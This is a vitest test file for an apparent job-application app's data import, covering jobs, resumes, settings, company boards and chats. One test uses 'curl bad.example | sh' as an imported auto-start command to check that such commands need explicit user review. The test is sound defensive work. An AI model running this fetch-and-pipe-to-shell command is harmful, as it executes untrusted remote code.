import { describe, it, expect, vi, beforeEach } from 'vitest'
import { drizzle } from 'drizzle-orm/better-sqlite3'
import { createTestDb } from '../db/testDb'
import type * as schema from '../db/schema'

let testDb: ReturnType<typeof drizzle<typeof schema>>
vi.mock('../db/index', () => ({ getDb: () => testDb }))

const broadcasts = vi.hoisted(() => ({ chatEvent: vi.fn(), agentMode: vi.fn() }))
vi.mock('../ipc/chatBroadcast', () => ({ broadcastChatEvent: broadcasts.chatEvent }))
vi.mock('../openrouter/broadcast', () => ({ broadcastAgentModeChanged: broadcasts.agentMode }))

beforeEach(() => {
  testDb = createTestDb().db
  broadcasts.chatEvent.mockReset()
  broadcasts.agentMode.mockReset()
})

import { applyImport, requiresAutoStartReview } from './applyImport'
import { listAllJobs } from '../db/repositories/jobsRepository'
import { listAllExclusions, isUrlExcluded } from '../db/repositories/jobExclusionsRepository'
import { listAllIndexedJobs, upsertIndexedJobs } from '../db/repositories/indexedJobsRepository'
import { listAllCompanyBoards } from '../db/repositories/companyBoardsRepository'
import { getProfile } from '../db/repositories/profileRepository'
import { listAllVariants, saveMasterResume, saveVariant } from '../db/repositories/resumeRepository'
import { listChatSessions } from '../db/repositories/chatRepository'
import {
  getAgentMode,
  getAutoStartCommand,
  getIndexedJobsRetentionDays,
  getNotificationPreferences,
  getOpenRouterSettings,
  getResumeSettings,
  getSearchCountry,
  setAgentMode,
  setOpenRouterSettings,
  setSearchCountry,
  setStorageMode
} from '../db/repositories/settingsRepository'
import { SAMPLE_RESUME_CONTENT } from '@shared/resume/sampleContent'
import { EXPORT_SCHEMA_VERSION, allDomainsSelected } from '@shared/types/dataTransfer'
import type { ExportBundle, ExportSelection } from '@shared/types/dataTransfer'
import type { JobRecord } from '@shared/types/job'
import type { ExclusionRecord } from '@shared/types/exclusion'
import type { ProfileFields } from '@shared/types/profile'
import type { ExportCompanyBoard } from '@shared/types/dataTransfer'
import { MAX_COMPANY_BOARDS } from '@shared/constants'

function bundle(data: ExportBundle['data']): ExportBundle {
  return { schemaVersion: EXPORT_SCHEMA_VERSION, exportedAt: '2020-01-01T00:00:00.000Z', appVersion: '1.0.0', data }
}

const NO_SELECTION: ExportSelection = allDomainsSelected(false)

const jobFixture: JobRecord = {
  id: 'external-id',
  externalId: null,
  source: null,
  title: 'Backend Engineer',
  company: 'Acme',
  location: null,
  url: 'https://example.com/imported',
  description: null,
  salaryRange: null,
  status: 'queued',
  matchScore: null,
  matchReasons: null,
  applicationUrl: null,
  applyMethod: null,
  screenshotPath: null,
  screenshotPaths: [],
  failureTag: null,
  failureMessage: null,
  blockingReason: null,
  blockingTaskId: null,
  queuedAt: '2020-01-01T00:00:00.000Z',
  filledAt: null,
  submittedAt: null,
  resumeVariantId: null,
  createdAt: '2020-01-01T00:00:00.000Z',
  updatedAt: '2020-01-01T00:00:00.000Z'
}

const exclusionFixture: ExclusionRecord = {
  id: 'external-id-2',
  url: 'https://example.com/excluded',
  title: 'Bad Job',
  company: 'Acme',
  reason: 'spam',
  excludedBy: 'user',
  createdAt: '2020-01-01T00:00:00.000Z'
}

function boardFixture(overrides: Partial<ExportCompanyBoard> = {}): ExportCompanyBoard {
  return {
    provider: 'greenhouse',
    token: 'acme',
    host: null,
    site: null,
    companyName: 'Acme Labs',
    addedBy: 'user',
    enabled: true,
    createdAt: '2020-01-01T00:00:00.000Z',
    ...overrides
  }
}

const profileFixture: ProfileFields = {
  fullName: 'Jane Doe',
  email: 'jane@example.com',
  phone: '',
  location: '',
  linkedinUrl: '',
  githubUrl: '',
  portfolioUrl: '',
  workAuthorization: '',
  desiredRoles: [],
  desiredLocations: [],
  remotePreference: 'no_preference',
  salaryMin: null,
  salaryMax: null,
  salaryCurrency: '',
  yearsExperience: null,
  summary: '',
  skills: [],
  additionalInformation: []
}

const indexedFixture = {
  url: 'https://example.com/indexed/1',
  title: 'Platform Engineer',
  company: 'Globex',
  location: 'Remote',
  source: 'greenhouse',
  snippet: 'Role',
  salaryRange: null,
  postedAt: null,
  searchQuery: 'platform',
  searchLocation: null,
  firstSeenAt: '2020-01-01T00:00:00.000Z',
  lastSeenAt: '2020-01-02T00:00:00.000Z',
  seenCount: 4
}

describe('applyImport — indexed jobs', () => {
  it('merges the search history alongside what this install has indexed', () => {
    const result = applyImport(bundle({ indexedJobs: [indexedFixture] }), { ...NO_SELECTION, indexedJobs: true })

    expect(result.indexedJobs).toEqual({ imported: 1, skipped: 0 })
    expect(listAllIndexedJobs()).toHaveLength(1)
  })

  it('leaves a url this install already indexed alone', () => {
    upsertIndexedJobs(
      [{ title: 'Local Title', company: 'Globex', url: indexedFixture.url, source: 'lever', snippet: 'Role' }],
      'local query',
      null
    )

    const result = applyImport(bundle({ indexedJobs: [indexedFixture] }), { ...NO_SELECTION, indexedJobs: true })

    expect(result.indexedJobs).toEqual({ imported: 0, skipped: 1 })
    expect(listAllIndexedJobs()[0]!.title).toBe('Local Title')
  })

  it('is untouched when the domain is not selected', () => {
    const result = applyImport(bundle({ indexedJobs: [indexedFixture] }), NO_SELECTION)

    expect(result.indexedJobs).toBeUndefined()
    expect(listAllIndexedJobs()).toHaveLength(0)
  })

  it('is a no-op for a bundle that predates the domain', () => {
    const result = applyImport(bundle({}), { ...NO_SELECTION, indexedJobs: true })
    expect(result.indexedJobs).toBeUndefined()
  })
})

describe('applyImport', () => {
  it('requires an exact review acknowledgment for a selected imported auto-start command', () => {
    const source = bundle({ settings: { autoStartCommand: 'curl bad.example | sh', indexedJobsRetentionDays: 30 } })
    const selected = { ...NO_SELECTION, settings: true }

    expect(requiresAutoStartReview(source, selected, undefined)).toBe(true)
    expect(requiresAutoStartReview(source, selected, 'different command')).toBe(true)
    expect(requiresAutoStartReview(source, selected, 'curl bad.example | sh')).toBe(false)
    expect(requiresAutoStartReview(source, NO_SELECTION, undefined)).toBe(false)
  })

  it('does not require review for the disabled auto-start setting', () => {
    const source = bundle({ settings: { autoStartCommand: '', indexedJobsRetentionDays: 30 } })
    expect(requiresAutoStartReview(source, { ...NO_SELECTION, settings: true }, undefined)).toBe(false)
  })

  it('imports jobs when selected and present, reporting counts', () => {
    const result = applyImport(bundle({ jobs: [jobFixture] }), { ...NO_SELECTION, jobs: true })
    expect(result.jobs).toEqual({ imported: 1, skipped: 0 })
    expect(listAllJobs()).toHaveLength(1)
  })

  it('does not import jobs when not selected, even though the bundle has them', () => {
    const result = applyImport(bundle({ jobs: [jobFixture] }), NO_SELECTION)
    expect(result.jobs).toBeUndefined()
    expect(listAllJobs()).toHaveLength(0)
  })

  it('is a no-op for a domain that is selected but absent from the bundle (a partial export file)', () => {
    const result = applyImport(bundle({ jobs: [jobFixture] }), { ...NO_SELECTION, jobs: true, exclusions: true })
    expect(result.exclusions).toBeUndefined()
    expect(listAllExclusions()).toHaveLength(0)
  })

  it('imports resumes by name and re-links jobs to variants by name, counting unknown names', () => {
    setStorageMode('plaintext')
    const result = applyImport(
      bundle({
        jobs: [
          { ...jobFixture, resumeVariantName: 'Backend' },
          { ...jobFixture, id: 'external-2', url: 'https://example.com/imported-2', resumeVariantName: 'Gone' },
          { ...jobFixture, id: 'external-3', url: 'https://example.com/imported-3', resumeVariantName: null }
        ],
        resumes: {
          master: { content: SAMPLE_RESUME_CONTENT, templateId: 'modern', pageSize: 'a4' },
          variants: [{ name: 'Backend', content: SAMPLE_RESUME_CONTENT, templateId: 'compact' }],
          settings: { fallbackAttachment: 'master', autoTailor: true }
        }
      }),
      { ...NO_SELECTION, jobs: true, resumes: true }
    )
    expect(result.jobs).toEqual({ imported: 3, skipped: 0 })
    expect(result.resumes).toEqual({ imported: 2, skipped: 0 })
    expect(getResumeSettings()).toEqual({ fallbackAttachment: 'master', autoTailor: true })
    expect(result.resumeSettings).toBe(true)
    expect(result.resumeAssignments).toEqual({ linked: 1, unresolved: 1 })
    const backend = listAllVariants().find((variant) => variant.name === 'Backend')!
    const jobs = listAllJobs()
    expect(jobs.find((job) => job.url === 'https://example.com/imported')?.resumeVariantId).toBe(backend.id)
    expect(jobs.find((job) => job.url === 'https://example.com/imported-2')?.resumeVariantId).toBeNull()
    expect(jobs.find((job) => job.url === 'https://example.com/imported-3')?.resumeVariantId).toBeNull()
  })

  it('links jobs to variants that already exist here when only the jobs domain is selected, and reports nothing without names', () => {
    setStorageMode('plaintext')
    saveMasterResume({ content: SAMPLE_RESUME_CONTENT })
    const backend = saveVariant({ name: 'backend', content: SAMPLE_RESUME_CONTENT })
    const linked = applyImport(
      bundle({
        jobs: [{ ...jobFixture, resumeVariantName: 'Backend' }],
        resumes: { master: null, variants: [{ name: 'Other', content: SAMPLE_RESUME_CONTENT, templateId: 'classic' }] }
      }),
      { ...NO_SELECTION, jobs: true }
    )
    expect(linked.resumes).toBeUndefined()
    // Settings travel with the resumes domain, so a jobs-only import leaves them alone.
    expect(getResumeSettings()).toEqual({ fallbackAttachment: 'original', autoTailor: false })
    expect(linked.resumeAssignments).toEqual({ linked: 1, unresolved: 0 })
    expect(listAllJobs()[0]?.resumeVariantId).toBe(backend.id)
    expect(listAllVariants()).toHaveLength(1)

    const plain = applyImport(bundle({ jobs: [{ ...jobFixture, id: 'x', url: 'https://example.com/plain' }] }), { ...NO_SELECTION, jobs: true })
    expect(plain.resumeAssignments).toBeUndefined()
  })

  it('imports exclusions when selected and present', () => {
    const result = applyImport(bundle({ exclusions: [exclusionFixture] }), { ...NO_SELECTION, exclusions: true })
    expect(result.exclusions).toEqual({ imported: 1, skipped: 0 })
    expect(isUrlExcluded(exclusionFixture.url)).toBe(true)
  })

  it('overwrites the profile when selected', () => {
    const result = applyImport(bundle({ profile: profileFixture }), { ...NO_SELECTION, profile: true })
    expect(result.profile).toBe(true)
    expect(getProfile()?.fullName).toBe('Jane Doe')
  })

  it('overwrites settings when selected', () => {
    const result = applyImport(
      bundle({
        settings: {
          autoStartCommand: 'claude',
          indexedJobsRetentionDays: 14,
          notificationPreferences: {
            enabled: false,
            verificationRequired: true,
            permissionRequired: false,
            jobFilled: false,
            jobFailed: true
          },
          searchCountry: 'nz'
        }
      }),
      { ...NO_SELECTION, settings: true }
    )
    expect(result.settings).toBe(true)
    expect(getAutoStartCommand()).toBe('claude')
    expect(getIndexedJobsRetentionDays()).toBe(14)
    expect(getSearchCountry()).toBe('nz')
    expect(getNotificationPreferences()).toEqual({
      enabled: false,
      verificationRequired: true,
      permissionRequired: false,
      jobFilled: false,
      jobFailed: true
    })
  })

  it('imports agent mode and OpenRouter settings when present', () => {
    const result = applyImport(
      bundle({
        settings: {
          autoStartCommand: '',
          indexedJobsRetentionDays: 30,
          agentMode: 'openrouter',
          openrouter: { modelId: 'openai/gpt-5', reasoningEffort: 'high', toolApproval: { askFor: ['queue_job'] } }
        }
      }),
      { ...NO_SELECTION, settings: true }
    )
    expect(result.settings).toBe(true)
    expect(getAgentMode()).toBe('openrouter')
    // The shell's mode store only hears pushes, so the import pushes too.
    expect(broadcasts.agentMode).toHaveBeenCalledWith('openrouter')
    expect(getOpenRouterSettings()).toEqual({
      modelId: 'openai/gpt-5',
      reasoningEffort: 'high',
      toolApproval: { askFor: ['queue_job'] }
    })
  })

  it('keeps the current agent mode and OpenRouter settings when importing a bundle written before they existed', () => {
    setAgentMode('openrouter')
    setOpenRouterSettings({ modelId: 'existing/model', reasoningEffort: 'low', toolApproval: { askFor: [] } })
    applyImport(bundle({ settings: { autoStartCommand: 'codex', indexedJobsRetentionDays: 60 } }), {
      ...NO_SELECTION,
      settings: true
    })
    expect(getAgentMode()).toBe('openrouter')
    expect(getOpenRouterSettings()).toEqual({ modelId: 'existing/model', reasoningEffort: 'low', toolApproval: { askFor: [] } })
  })

  it('keeps current notification preferences and search country when importing an older settings bundle', () => {
    setSearchCountry('au')
    const before = getNotificationPreferences()
    applyImport(bundle({ settings: { autoStartCommand: 'codex', indexedJobsRetentionDays: 60 } }), {
      ...NO_SELECTION,
      settings: true
    })
    expect(getNotificationPreferences()).toEqual(before)
    expect(getSearchCountry()).toBe('au')
  })

  it('imports company boards when selected and present', () => {
    const result = applyImport(bundle({ companyBoards: [boardFixture()] }), {
      ...NO_SELECTION,
      companyBoards: true
    })
    expect(result.companyBoards).toEqual({ imported: 1, skipped: 0 })

    const stored = listAllCompanyBoards()
    expect(stored).toHaveLength(1)
    expect(stored[0]?.companyName).toBe('Acme Labs')
    // Derived here, never read from the file.
    expect(stored[0]?.boardKey).toBe('greenhouse:acme')
    expect(stored[0]?.enabled).toBe(true)
  })

  it('brings a board in unchecked rather than carrying the exporting machine\'s last fetch', () => {
    applyImport(bundle({ companyBoards: [boardFixture()] }), { ...NO_SELECTION, companyBoards: true })

    const stored = listAllCompanyBoards()[0]
    expect(stored?.lastCheckedAt).toBeNull()
    expect(stored?.lastJobCount).toBeNull()
    expect(stored?.lastError).toBeNull()
  })

  it('keeps a paused board paused, since pausing is a decision worth carrying', () => {
    applyImport(bundle({ companyBoards: [boardFixture({ enabled: false })] }), {
      ...NO_SELECTION,
      companyBoards: true
    })
    expect(listAllCompanyBoards()[0]?.enabled).toBe(false)
  })

  it('merges into the existing watchlist instead of replacing it, skipping a board already tracked', () => {
    applyImport(bundle({ companyBoards: [boardFixture()] }), { ...NO_SELECTION, companyBoards: true })

    const result = applyImport(
      bundle({ companyBoards: [boardFixture({ companyName: 'Renamed' }), boardFixture({ token: 'other' })] }),
      { ...NO_SELECTION, companyBoards: true }
    )

    expect(result.companyBoards).toEqual({ imported: 1, skipped: 1 })
    expect(listAllCompanyBoards()).toHaveLength(2)
    // The already-tracked row is left exactly as it was, not renamed by the file.
    expect(listAllCompanyBoards().find((b) => b.token === 'acme')?.companyName).toBe('Acme Labs')
  })

  it('derives the board key from the descriptor, ignoring a token whose case differs', () => {
    applyImport(bundle({ companyBoards: [boardFixture({ token: 'Acme' })] }), {
      ...NO_SELECTION,
      companyBoards: true
    })
    const result = applyImport(bundle({ companyBoards: [boardFixture({ token: 'acme' })] }), {
      ...NO_SELECTION,
      companyBoards: true
    })
    expect(result.companyBoards).toEqual({ imported: 0, skipped: 1 })
  })

  it('skips a Workday board with no host or site, which nothing could ever fetch', () => {
    const result = applyImport(
      bundle({
        companyBoards: [
          boardFixture({ provider: 'workday', token: 'acme', host: null, site: null }),
          boardFixture({
            provider: 'workday',
            token: 'acme',
            host: 'acme.wd5.myworkdayjobs.com',
            site: 'Careers'
          })
        ]
      }),
      { ...NO_SELECTION, companyBoards: true }
    )

    expect(result.companyBoards).toEqual({ imported: 1, skipped: 1 })
    expect(listAllCompanyBoards()).toHaveLength(1)
    expect(listAllCompanyBoards()[0]?.site).toBe('Careers')
  })

  it('stops at the watchlist ceiling instead of importing a file past it', () => {
    const boards = Array.from({ length: MAX_COMPANY_BOARDS + 5 }, (_, i) => boardFixture({ token: `co-${i}` }))
    const result = applyImport(bundle({ companyBoards: boards }), { ...NO_SELECTION, companyBoards: true })

    expect(result.companyBoards).toEqual({ imported: MAX_COMPANY_BOARDS, skipped: 5 })
    expect(listAllCompanyBoards()).toHaveLength(MAX_COMPANY_BOARDS)
  })

  it('does not import company boards when not selected', () => {
    const result = applyImport(bundle({ companyBoards: [boardFixture()] }), NO_SELECTION)
    expect(result.companyBoards).toBeUndefined()
    expect(listAllCompanyBoards()).toHaveLength(0)
  })

  it('returns an empty summary and touches nothing when no domain is selected', () => {
    const result = applyImport(bundle({ jobs: [jobFixture], exclusions: [exclusionFixture] }), NO_SELECTION)
    expect(result).toEqual({})
    expect(listAllJobs()).toHaveLength(0)
    expect(listAllExclusions()).toHaveLength(0)
  })

  it('imports chats when selected and present, reporting skipped for a malformed session', () => {
    setStorageMode('plaintext')
    const result = applyImport(
      bundle({
        chats: [
          {
            title: 'Good',
            modelId: 'openai/gpt-5',
            createdAt: '2020-01-01T00:00:00.000Z',
            messages: [
              {
                role: 'user',
                content: 'hi',
                reasoning: null,
                toolCalls: null,
                toolCallId: null,
                modelId: null,
                usage: null,
                createdAt: '2020-01-01T00:00:00.000Z'
              }
            ]
          },
          {
            title: 'Bad',
            modelId: 'openai/gpt-5',
            createdAt: '2020-01-01T00:00:00.000Z',
            messages: [
              {
                role: 'not-a-role',
                content: 'hi',
                reasoning: null,
                toolCalls: null,
                toolCallId: null,
                modelId: null,
                usage: null,
                createdAt: '2020-01-01T00:00:00.000Z'
              }
            ]
          }
        ] as ExportBundle['data']['chats']
      }),
      { ...NO_SELECTION, chats: true }
    )
    expect(result.chats).toEqual({ imported: 1, skipped: 1 })
    const [stored] = listChatSessions()
    expect(stored?.title).toBe('Good')
    // An open chat panel learns of the new session the same way it learns of any other.
    expect(broadcasts.chatEvent).toHaveBeenCalledTimes(1)
    expect(broadcasts.chatEvent).toHaveBeenCalledWith({ type: 'session_updated', session: { ...stored, busy: false } })
  })

  it('does not import chats when not selected, and never deletes an existing session', () => {
    setStorageMode('plaintext')
    const withOne = applyImport(
      bundle({
        chats: [{ title: 'Kept', modelId: 'm', createdAt: '2020-01-01T00:00:00.000Z', messages: [] }] as ExportBundle['data']['chats']
      }),
      { ...NO_SELECTION, chats: true }
    )
    expect(withOne.chats).toEqual({ imported: 1, skipped: 0 })

    const result = applyImport(bundle({ chats: [] }), NO_SELECTION)
    expect(result.chats).toBeUndefined()
    expect(listChatSessions()).toHaveLength(1)
  })
})
